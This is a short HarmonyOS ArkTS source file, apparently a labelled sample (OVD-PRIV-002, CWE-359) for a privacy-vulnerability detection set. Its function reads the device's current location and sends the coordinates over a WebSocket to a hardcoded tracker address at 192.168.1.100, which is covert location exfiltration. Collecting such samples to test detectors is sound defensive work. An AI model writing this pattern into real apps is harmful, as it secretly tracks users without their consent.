// VULN: OVD-PRIV-002 持续定位上报内网 ws 通道（隐蔽跟踪，CWE-359）
import { geoLocationManager } from '@kit.LocationKit';
import { webSocket } from '@kit.NetworkKit';
import { BusinessError } from '@kit.BasicServicesKit';

export async function ovdPriv002(): Promise<string> {
  const loc: geoLocationManager.Location = await geoLocationManager.getCurrentLocation();
  const ws: webSocket.WebSocket = webSocket.createWebSocket();
  ws.connect('ws://192.168.1.100:9000/track', (err: BusinessError) => {
    if (!err) {
      ws.send(JSON.stringify({ lat: loc.latitude, lon: loc.longitude }));
      ws.close(() => {
      });
    }
  });
  return `location ${loc.latitude.toFixed(3)},${loc.longitude.toFixed(3)} -> ws tracker`;
}
